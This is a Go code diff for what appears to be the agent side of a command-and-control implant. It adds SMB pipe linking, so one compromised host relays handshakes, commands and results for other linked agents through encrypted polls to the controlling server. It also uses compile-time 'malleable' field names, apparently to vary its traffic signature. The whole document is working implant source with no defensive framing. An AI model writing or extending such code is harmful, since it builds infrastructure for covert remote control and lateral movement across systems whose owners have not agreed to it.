@@ -13,6 +13,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"io"
+	"log"
 	"math"
 	"math/rand"
 	"net/http"
@@ -32,6 +33,13 @@ var MALLEABLE_REKEY_COMMAND = "rekey_required"
 var MALLEABLE_REKEY_STATUS_FIELD = "status"
 var MALLEABLE_REKEY_DATA_FIELD = "data"
 var MALLEABLE_REKEY_ID_FIELD = "command_db_id"
+
+// Malleable JSON field names for SMB link protocol
+// These will be replaced at compile time via -ldflags
+var MALLEABLE_LINK_DATA_FIELD = "ld"         // Link data from connected SMB agents
+var MALLEABLE_LINK_COMMANDS_FIELD = "lc"     // Link commands from server for SMB agents
+var MALLEABLE_LINK_HANDSHAKE_FIELD = "lh"    // Link handshake data
+var MALLEABLE_LINK_HANDSHAKE_RESP_FIELD = "lr" // Link handshake response
 
 // PollConfig holds the configuration for polling behavior
 type PollConfig struct {
@@ -336,6 +344,33 @@ func doPoll(secureComms *SecureComms, customHeaders map[string]string) error {
 		return fmt.Errorf("rekey in progress")
 	}
 
+	// IMPORTANT: Process handshake responses BEFORE commands!
+	// The SMB agent is waiting in performHandshake for the handshake_response.
+	// If we send a command first, the SMB agent will receive "data" when expecting
+	// "handshake_response", fail the handshake, and close the pipe.
+	if linkRespVal, ok := responseMap[MALLEABLE_LINK_HANDSHAKE_RESP_FIELD]; ok {
+		if linkRespData, ok := linkRespVal.([]interface{}); ok {
+			log.Printf("[LinkManager] Processing %d handshake responses before commands", len(linkRespData))
+			processLinkHandshakeResponses(linkRespData)
+		}
+	}
+
+	// Now process link commands (for forwarding to SMB agents after handshake is complete)
+	// These are in the outer layer, not encrypted with our key
+	if linkCmdsVal, ok := responseMap[MALLEABLE_LINK_COMMANDS_FIELD]; ok {
+		if linkCmdsData, ok := linkCmdsVal.([]interface{}); ok {
+			processLinkCommands(linkCmdsData)
+
+			// After processing link commands, immediately send any queued responses
+			// This enables faster round-trip for linked agent commands
+			linkData := GetLinkManager().GetOutboundData()
+			if len(linkData) > 0 {
+				log.Printf("[LinkManager] Sending %d immediate link responses to server", len(linkData))
+				sendImmediateLinkData(secureComms, customHeaders, linkData)
+			}
+		}
+	}
+
 	// Check for no commands
 	if responseStatus == "no_commands" {
 		return nil
@@ -389,11 +424,164 @@ func doPoll(secureComms *SecureComms, customHeaders map[string]string) error {
 			} else {
 			}
 		}
-		//fmt.Println("[DEBUG] Command processing complete, rotating secret")
+
 		secureComms.RotateSecret()
 	}
 
 	return nil
+}
+
+// sendImmediateLinkData sends link data to the server without waiting for the next poll cycle
+// This enables faster round-trip for linked agent command responses
+func sendImmediateLinkData(secureComms *SecureComms, customHeaders map[string]string, linkData []*LinkDataOut) {
+	if len(linkData) == 0 {
+		return
+	}
+
+	// Build payload with only link data
+	payload := make(map[string]interface{})
+	payload["agent_id"] = clientID
+	payload[MALLEABLE_LINK_DATA_FIELD] = linkData
+
+	jsonData, err := json.Marshal(payload)
+	if err != nil {
+		log.Printf("[LinkManager] Failed to marshal immediate link data: %v", err)
+		// Re-queue the data so it's not lost
+		requeueLinkData(linkData)
+		return
+	}
+
+	encrypted, err := secureComms.EncryptMessage(string(jsonData))
+	if err != nil {
+		log.Printf("[LinkManager] Failed to encrypt immediate link data: %v", err)
+		// Re-queue the data so it's not lost
+		requeueLinkData(linkData)
+		return
+	}
+
+	if err := sendResults(encrypted, customHeaders); err != nil {
+		log.Printf("[LinkManager] Failed to send immediate link data: %v, re-queuing for next poll", err)
+		// Re-queue the data so it's not lost - will be sent on next poll cycle
+		requeueLinkData(linkData)
+	} else {
+		log.Printf("[LinkManager] Successfully sent %d immediate link responses to server", len(linkData))
+		secureComms.RotateSecret()
+	}
+}
+
+// requeueLinkData puts link data back into the outbound queue when immediate send fails
+func requeueLinkData(linkData []*LinkDataOut) {
+	lm := GetLinkManager()
+	for _, item := range linkData {
+		lm.queueOutboundData(item)
+	}
+	log.Printf("[LinkManager] Re-queued %d link data items for next poll cycle", len(linkData))
+}
+
+// processLinkCommands forwards commands from the server to linked SMB agents
+// and waits briefly for responses to enable faster round-trips
+func processLinkCommands(linkCmds []interface{}) {
+	lm := GetLinkManager()
+
+	log.Printf("[LinkManager] Processing %d link commands", len(linkCmds))
+
+	// Timeout for waiting for command responses (5 seconds is reasonable for most commands)
+	const commandResponseTimeout = 5 * time.Second
+
+	for _, cmd := range linkCmds {
+		cmdMap, ok := cmd.(map[string]interface{})
+		if !ok {
+			continue
+		}
+
+		// Extract routing ID and payload using malleable field names
+		routingID, _ := cmdMap["r"].(string)
+		payload, _ := cmdMap["p"].(string)
+
+		if routingID == "" || payload == "" {
+			continue
+		}
+
+		// Forward to the linked agent and wait for response
+		log.Printf("[LinkManager] Forwarding command to linked agent %s (with %v timeout)", routingID, commandResponseTimeout)
+		response, err := lm.ForwardToLinkedAgentAndWait(routingID, payload, commandResponseTimeout)
+		if err != nil {
+			log.Printf("[LinkManager] Failed to forward command to %s: %v", routingID, err)
+			continue
+		}
+
+		if response != nil {
+			// Got an immediate response - queue it for the server
+			log.Printf("[LinkManager] Got immediate response from %s, queuing for server", routingID)
+			lm.queueOutboundData(response)
+		} else {
+			log.Printf("[LinkManager] No immediate response from %s (will come later)", routingID)
+		}
+	}
+}
+
+// processLinkHandshakeResponses forwards handshake responses from server to SMB agents
+func processLinkHandshakeResponses(responses []interface{}) {
+	lm := GetLinkManager()
+
+	for _, resp := range responses {
+		respMap, ok := resp.(map[string]interface{})
+		if !ok {
+			continue
+		}
+
+		// Extract routing ID and payload
+		routingID, _ := respMap["r"].(string)
+		payload, _ := respMap["p"].(string)
+
+		if routingID == "" || payload == "" {
+			continue
+		}
+
+		// Get the linked agent - use direct map access to bypass IsActive check
+		// Handshake responses are critical and should be attempted even if link appears inactive
+		// (the SMB agent may still be waiting with a long timeout)
+		lm.mu.RLock()
+		link, exists := lm.links[routingID]
+		lm.mu.RUnlock()
+
+		if !exists || link == nil {
+			log.Printf("[LinkManager] No link found for routing_id %s when forwarding handshake response", routingID)
+			continue
+		}
+
+		// Send handshake response to SMB agent
+		message := map[string]string{
+			"type":    "handshake_response",
+			"payload": payload,
+		}
+
+		data, err := json.Marshal(message)
+		if err != nil {
+			continue
+		}
+
+		// Try to send regardless of IsActive - the SMB agent may be waiting with long timeout
+		link.mu.Lock()
+		if link.Conn != nil {
+			log.Printf("[LinkManager] Forwarding handshake response to routing_id %s (IsActive=%v)", routingID, link.IsActive)
+			if err := writeMessage(link.Conn, data); err != nil {
+				log.Printf("[LinkManager] Failed to send handshake response to %s: %v", routingID, err)
+			} else {
+				log.Printf("[LinkManager] Successfully sent handshake response to routing_id %s", routingID)
+				link.LastSeen = time.Now()
+				// Re-activate link if it was marked inactive due to read timeout
+				// The handshake response completing successfully proves the pipe is still alive
+				if !link.IsActive {
+					link.IsActive = true
+					log.Printf("[LinkManager] Re-activated link %s after successful handshake response", routingID)
+				}
+			}
+		} else {
+			log.Printf("[LinkManager] Link %s has nil connection, cannot send handshake response", routingID)
+		}
+		link.mu.Unlock()
+	}
 }
 
 // startPolling initializes and starts the polling routine
@@ -462,46 +650,63 @@ func startPolling(config PollConfig, sysInfo *SystemInfoReport) error {
 				nextInterval = backoffInterval
 			}
 
+			// Collect link data from connected SMB agents (if any)
+			linkData := GetLinkManager().GetOutboundData()
+			// Collect unlink notifications (routing IDs that have been disconnected)
+			unlinkNotifications := GetLinkManager().GetUnlinkNotifications()
+
 			// Handle pending results before sleep
-			if resultManager.HasResults() {
+			hasResults := resultManager.HasResults()
+			hasLinkData := len(linkData) > 0
+			hasUnlinkNotifications := len(unlinkNotifications) > 0
+
+			// Debug logging
+			log.Printf("[Polling] Iteration start: hasResults=%v, hasLinkData=%v, hasUnlinkNotifications=%v, unlinkCount=%d",
+				hasResults, hasLinkData, hasUnlinkNotifications, len(unlinkNotifications))
+
+			if hasResults || hasLinkData || hasUnlinkNotifications {
 				results := resultManager.GetPendingResults()
+
+				// Build dynamic payload structure that includes link data if present
+				payload := make(map[string]interface{})
+				payload["agent_id"] = clientID
+
 				if len(results) > 0 {
-					encryptedData := struct {
-						AgentID string            `json:"agent_id"`
-						Results []CommandResponse `json:"results"`
-					}{
-						AgentID: clientID,
-						Results: results,
-					}
-					//fmt.Println("\n=== Outgoing Command Queue Before Encryption ===")
-					jsonData, err := json.Marshal(encryptedData)
+					payload["results"] = results
+				}
+
+				// Include link data if we have any (uses malleable field names)
+				if hasLinkData {
+					log.Printf("[LinkManager] Including %d link data items in POST to server", len(linkData))
+					payload[MALLEABLE_LINK_DATA_FIELD] = linkData
+				}
+
+				// Include unlink notifications if we have any (routing IDs that have been disconnected)
+				if hasUnlinkNotifications {
+					log.Printf("[LinkManager] Including %d unlink notifications in POST to server", len(unlinkNotifications))
+					payload["lu"] = unlinkNotifications // "lu" = link_unlink
+				}
+
+				jsonData, err := json.Marshal(payload)
+				if err != nil {
+				} else {
+					encrypted, err := secureComms.EncryptMessage(string(jsonData))
 					if err != nil {
 					} else {
-						// ADD DEBUG TO SHOW JSON STRUCTURE
-						preview := string(jsonData)
-						if len(preview) > 500 {
-							preview = preview[:500] + "..."
-						}
-
-						//fmt.Println(string(jsonData))
-						encrypted, err := secureComms.EncryptMessage(string(jsonData))
-						if err != nil {
+						// Updated call - no config parameter
+						if err := sendResults(encrypted, customHeaders); err != nil {
 						} else {
-							// Updated call - no config parameter
-							if err := sendResults(encrypted, customHeaders); err != nil {
-							} else {
-								// Only cleanup after confirmed send
-								for _, result := range results {
-									if result.CurrentChunk > 0 && result.CurrentChunk == result.TotalChunks {
-										commandQueue.mu.Lock()
-										if _, exists := commandQueue.activeDownloads[result.Filename]; exists {
-											delete(commandQueue.activeDownloads, result.Filename)
-										}
-										commandQueue.mu.Unlock()
+							// Only cleanup after confirmed send
+							for _, result := range results {
+								if result.CurrentChunk > 0 && result.CurrentChunk == result.TotalChunks {
+									commandQueue.mu.Lock()
+									if _, exists := commandQueue.activeDownloads[result.Filename]; exists {
+										delete(commandQueue.activeDownloads, result.Filename)
 									}
+									commandQueue.mu.Unlock()
 								}
-								secureComms.RotateSecret()
 							}
+							secureComms.RotateSecret()
 						}
 					}
 				}
